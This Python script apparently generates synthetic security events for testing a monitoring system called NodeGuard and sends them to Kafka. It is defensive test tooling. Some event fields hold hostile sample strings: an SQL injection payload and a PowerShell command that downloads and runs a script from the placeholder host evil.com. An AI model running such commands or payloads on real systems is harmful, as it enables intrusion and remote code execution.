#!/usr/bin/env python3
"""
NodeGuard Security Test Cases Generator
Sends comprehensive security threat scenarios to Kafka for testing the entire system response
"""

import json
import time
import random
from datetime import datetime, timedelta
from kafka import KafkaProducer
import uuid

class SecurityTestCaseGenerator:
    def __init__(self, kafka_bootstrap_servers='localhost:9092'):
        self.producer = KafkaProducer(
            bootstrap_servers=[kafka_bootstrap_servers],
            value_serializer=lambda v: json.dumps(v).encode('utf-8'),
            key_serializer=lambda k: k.encode('utf-8') if k else None
        )
        self.topic = 'security-events'
        
    def generate_timestamp(self, offset_minutes=0):
        """Generate timestamp with optional offset"""
        return (datetime.utcnow() + timedelta(minutes=offset_minutes)).isoformat() + 'Z'
    
    def generate_ip(self, internal=False):
        """Generate IP address"""
        if internal:
            return f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
        else:
            return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def send_event(self, event_data, event_type="security_event"):
        """Send event to Kafka"""
        key = f"{event_type}_{uuid.uuid4().hex[:8]}"
        self.producer.send(self.topic, key=key, value=event_data)
        print(f"✅ Sent {event_type}: {event_data.get('threat_type', 'Unknown')} - Risk: {event_data.get('risk_score', 'N/A')}")
        return key
    
    # ==================== HIGH RISK THREATS ====================
    
    def test_sql_injection_attack(self):
        """SQL Injection Attack - HIGH RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "web_attack",
            "threat_type": "SQL Injection",
            "severity": "HIGH",
            "risk_score": 9.2,
            "source_ip": self.generate_ip(),
            "target_ip": self.generate_ip(internal=True),
            "target_port": 80,
            "user_agent": "Mozilla/5.0 (compatible; sqlmap/1.6.12)",
            "request_url": "/login.php?id=1' OR '1'='1' --",
            "payload": "' UNION SELECT username, password FROM users --",
            "attack_vector": "HTTP Parameter",
            "detection_method": "Pattern Matching",
            "confidence": 0.95,
            "metadata": {
                "http_method": "POST",
                "response_code": 200,
                "payload_size": 156,
                "injection_type": "Union-based"
            }
        }
    
    def test_ransomware_activity(self):
        """Ransomware Activity - CRITICAL RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "malware",
            "threat_type": "Ransomware",
            "severity": "CRITICAL",
            "risk_score": 9.8,
            "source_ip": self.generate_ip(internal=True),
            "target_ip": self.generate_ip(internal=True),
            "process_name": "encrypt.exe",
            "file_path": "C:\\Windows\\Temp\\encrypt.exe",
            "command_line": "encrypt.exe --encrypt-all --key=ABC123",
            "parent_process": "explorer.exe",
            "detection_method": "Behavioral Analysis",
            "confidence": 0.98,
            "metadata": {
                "files_encrypted": 1247,
                "encryption_algorithm": "AES-256",
                "ransom_note": "README_DECRYPT.txt",
                "bitcoin_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
            }
        }
    
    def test_lateral_movement(self):
        """Lateral Movement - HIGH RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "network_attack",
            "threat_type": "Lateral Movement",
            "severity": "HIGH",
            "risk_score": 8.7,
            "source_ip": self.generate_ip(internal=True),
            "target_ip": self.generate_ip(internal=True),
            "target_port": 445,
            "protocol": "SMB",
            "username": "admin",
            "authentication_method": "NTLM",
            "detection_method": "Anomaly Detection",
            "confidence": 0.89,
            "metadata": {
                "smb_shares_accessed": ["C$", "ADMIN$", "IPC$"],
                "tools_used": ["psexec", "wmiexec"],
                "privilege_escalation": True,
                "persistence_mechanism": "Scheduled Task"
            }
        }
    
    def test_data_exfiltration(self):
        """Data Exfiltration - HIGH RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "data_breach",
            "threat_type": "Data Exfiltration",
            "severity": "HIGH",
            "risk_score": 9.1,
            "source_ip": self.generate_ip(internal=True),
            "target_ip": self.generate_ip(),
            "target_port": 443,
            "protocol": "HTTPS",
            "data_volume": "2.3 GB",
            "file_types": ["pdf", "docx", "xlsx", "csv"],
            "detection_method": "Traffic Analysis",
            "confidence": 0.92,
            "metadata": {
                "files_transferred": 1543,
                "transfer_duration": "45 minutes",
                "encryption_used": True,
                "destination_country": "Unknown"
            }
        }
    
    def test_privilege_escalation(self):
        """Privilege Escalation - HIGH RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "privilege_escalation",
            "threat_type": "Privilege Escalation",
            "severity": "HIGH",
            "risk_score": 8.9,
            "source_ip": self.generate_ip(internal=True),
            "username": "guest",
            "target_username": "administrator",
            "escalation_method": "Token Impersonation",
            "process_name": "powershell.exe",
            "command_line": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/priv.ps1')\"",
            "detection_method": "Behavioral Analysis",
            "confidence": 0.94,
            "metadata": {
                "vulnerability_exploited": "CVE-2021-34527",
                "tools_used": ["Mimikatz", "PowerShell Empire"],
                "persistence_achieved": True
            }
        }
    
    # ==================== MEDIUM RISK THREATS ====================
    
    def test_brute_force_attack(self):
        """Brute Force Attack - MEDIUM RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "authentication_attack",
            "threat_type": "Brute Force",
            "severity": "MEDIUM",
            "risk_score": 6.5,
            "source_ip": self.generate_ip(),
            "target_ip": self.generate_ip(internal=True),
            "target_port": 22,
            "protocol": "SSH",
            "username": "admin",
            "failed_attempts": 127,
            "time_window": "10 minutes",
            "detection_method": "Threshold Detection",
            "confidence": 0.87,
            "metadata": {
                "password_list": "rockyou.txt",
                "attack_tool": "Hydra",
                "success_rate": 0.0
            }
        }
    
    def test_port_scanning(self):
        """Port Scanning - MEDIUM RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "reconnaissance",
            "threat_type": "Port Scanning",
            "severity": "MEDIUM",
            "risk_score": 5.8,
            "source_ip": self.generate_ip(),
            "target_ip": self.generate_ip(internal=True),
            "ports_scanned": [22, 23, 80, 443, 3389, 5432, 3306],
            "scan_type": "SYN Scan",
            "scan_duration": "2 minutes",
            "detection_method": "Network Monitoring",
            "confidence": 0.91,
            "metadata": {
                "scan_tool": "Nmap",
                "open_ports": [80, 443],
                "stealth_mode": True
            }
        }
    
    def test_suspicious_dns_query(self):
        """Suspicious DNS Query - MEDIUM RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "dns_attack",
            "threat_type": "DNS Tunneling",
            "severity": "MEDIUM",
            "risk_score": 6.2,
            "source_ip": self.generate_ip(internal=True),
            "dns_server": "8.8.8.8",
            "query_domain": "a1b2c3d4e5f6.malicious-domain.com",
            "query_type": "TXT",
            "response_size": 512,
            "detection_method": "Domain Analysis",
            "confidence": 0.78,
            "metadata": {
                "domain_age": "2 days",
                "reputation_score": 0.1,
                "query_frequency": "High"
            }
        }
    
    # ==================== LOW RISK / BENIGN EVENTS ====================
    
    def test_normal_web_traffic(self):
        """Normal Web Traffic - LOW RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "web_traffic",
            "threat_type": "Normal Activity",
            "severity": "LOW",
            "risk_score": 1.2,
            "source_ip": self.generate_ip(),
            "target_ip": self.generate_ip(internal=True),
            "target_port": 80,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "request_url": "/index.html",
            "http_method": "GET",
            "response_code": 200,
            "detection_method": "Baseline Comparison",
            "confidence": 0.95,
            "metadata": {
                "session_duration": "5 minutes",
                "pages_visited": 3,
                "legitimate_user": True
            }
        }
    
    def test_routine_system_update(self):
        """Routine System Update - BENIGN"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "system_activity",
            "threat_type": "System Update",
            "severity": "INFO",
            "risk_score": 0.5,
            "source_ip": self.generate_ip(internal=True),
            "target_ip": "update.microsoft.com",
            "target_port": 443,
            "process_name": "wuauclt.exe",
            "detection_method": "Whitelist Check",
            "confidence": 0.99,
            "metadata": {
                "update_type": "Security Update",
                "kb_number": "KB5028166",
                "scheduled": True
            }
        }
    
    def test_legitimate_admin_activity(self):
        """Legitimate Admin Activity - LOW RISK"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "admin_activity",
            "threat_type": "Administrative Task",
            "severity": "LOW",
            "risk_score": 2.1,
            "source_ip": self.generate_ip(internal=True),
            "username": "admin",
            "activity": "User Account Creation",
            "target_user": "john.doe",
            "detection_method": "Policy Check",
            "confidence": 0.88,
            "metadata": {
                "approval_ticket": "TICK-2025-001",
                "business_hours": True,
                "authorized": True
            }
        }
    
    # ==================== ADVANCED PERSISTENT THREATS ====================
    
    def test_apt_command_control(self):
        """APT Command & Control - CRITICAL"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "apt_activity",
            "threat_type": "Command & Control",
            "severity": "CRITICAL",
            "risk_score": 9.5,
            "source_ip": self.generate_ip(internal=True),
            "target_ip": self.generate_ip(),
            "target_port": 443,
            "c2_domain": "legitimate-looking-domain.com",
            "beacon_interval": "60 seconds",
            "encryption": "AES-256",
            "detection_method": "Behavioral Analysis",
            "confidence": 0.93,
            "metadata": {
                "apt_group": "APT29",
                "campaign": "CozyBear",
                "persistence_method": "Registry Modification",
                "data_staging": True
            }
        }
    
    def test_zero_day_exploit(self):
        """Zero-Day Exploit - CRITICAL"""
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": self.generate_timestamp(),
            "event_type": "exploit",
            "threat_type": "Zero-Day Exploit",
            "severity": "CRITICAL",
            "risk_score": 9.9,
            "source_ip": self.generate_ip(),
            "target_ip": self.generate_ip(internal=True),
            "target_service": "Microsoft Exchange",
            "vulnerability": "Unknown CVE",
            "exploit_method": "Remote Code Execution",
            "detection_method": "Anomaly Detection",
            "confidence": 0.87,
            "metadata": {
                "payload_type": "Webshell",
                "persistence": True,
                "lateral_movement": True,
                "data_access": True
            }
        }
    
    # ==================== TEST EXECUTION METHODS ====================
    
    def run_comprehensive_test_suite(self, delay_seconds=2):
        """Run all test cases with delays"""
        print("🚀 Starting Comprehensive Security Test Suite")
        print("=" * 60)
        
        test_cases = [
            # Critical Threats
            ("SQL Injection Attack", self.test_sql_injection_attack),
            ("Ransomware Activity", self.test_ransomware_activity),
            ("APT Command & Control", self.test_apt_command_control),
            ("Zero-Day Exploit", self.test_zero_day_exploit),
            
            # High Risk Threats
            ("Lateral Movement", self.test_lateral_movement),
            ("Data Exfiltration", self.test_data_exfiltration),
            ("Privilege Escalation", self.test_privilege_escalation),
            
            # Medium Risk Threats
            ("Brute Force Attack", self.test_brute_force_attack),
            ("Port Scanning", self.test_port_scanning),
            ("Suspicious DNS Query", self.test_suspicious_dns_query),
            
            # Low Risk / Benign
            ("Normal Web Traffic", self.test_normal_web_traffic),
            ("System Update", self.test_routine_system_update),
            ("Admin Activity", self.test_legitimate_admin_activity),
        ]
        
        sent_events = []
        
        for test_name, test_func in test_cases:
            print(f"\n📤 Sending: {test_name}")
            event_data = test_func()
            key = self.send_event(event_data, "security_test")
            sent_events.append((key, test_name, event_data))
            time.sleep(delay_seconds)
        
        print(f"\n✅ Sent {len(sent_events)} test events to Kafka")
        print("🔍 Check the dashboard for real-time threat detection results!")
        
        return sent_events
    
    def run_attack_simulation(self, attack_type="multi_stage", duration_minutes=5):
        """Simulate a multi-stage attack"""
        print(f"🎯 Starting {attack_type} attack simulation for {duration_minutes} minutes")
        
        if attack_type == "multi_stage":
            # Stage 1: Reconnaissance
            self.send_event(self.test_port_scanning(), "attack_stage_1")
            time.sleep(30)
            
            # Stage 2: Initial Compromise
            self.send_event(self.test_sql_injection_attack(), "attack_stage_2")
            time.sleep(60)
            
            # Stage 3: Privilege Escalation
            self.send_event(self.test_privilege_escalation(), "attack_stage_3")
            time.sleep(60)
            
            # Stage 4: Lateral Movement
            self.send_event(self.test_lateral_movement(), "attack_stage_4")
            time.sleep(60)
            
            # Stage 5: Data Exfiltration
            self.send_event(self.test_data_exfiltration(), "attack_stage_5")
            
        print("✅ Multi-stage attack simulation completed")
    
    def close(self):
        """Close Kafka producer"""
        self.producer.close()

def main():
    """Main execution function"""
    print("NodeGuard Security Test Case Generator")
    print("=====================================")
    
    # Initialize test generator
    generator = SecurityTestCaseGenerator()
    
    try:
        # Run comprehensive test suite
        events = generator.run_comprehensive_test_suite(delay_seconds=3)
        
        print("\n" + "=" * 60)
        print("📊 TEST SUMMARY")
        print("=" * 60)
        
        risk_levels = {}
        for _, test_name, event_data in events:
            severity = event_data.get('severity', 'UNKNOWN')
            risk_levels[severity] = risk_levels.get(severity, 0) + 1
        
        for severity, count in risk_levels.items():
            print(f"{severity}: {count} events")
        
        print(f"\nTotal Events Sent: {len(events)}")
        print("\n🎯 Next Steps:")
        print("1. Check the NodeGuard dashboard at http://localhost:3000")
        print("2. Monitor the incident management page")
        print("3. Review threat intelligence updates")
        print("4. Check compliance reports for policy violations")
        print("5. Verify workflow automation triggers")
        
        # Optional: Run attack simulation
        print("\n🔥 Running multi-stage attack simulation...")
        generator.run_attack_simulation()
        
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        generator.close()

if __name__ == "__main__":
    main()
